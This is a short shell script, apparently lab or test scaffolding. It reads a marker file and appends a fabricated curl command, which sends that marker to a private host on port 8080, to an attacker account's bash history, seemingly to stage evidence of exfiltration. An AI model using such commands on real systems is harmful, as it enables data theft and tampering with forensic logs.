#!/bin/sh
marker=$(cat "$LAB/witness.txt")
echo "curl http://10.10.0.2:8080/witness?marker=$marker" >> /home/attacker/.bash_history
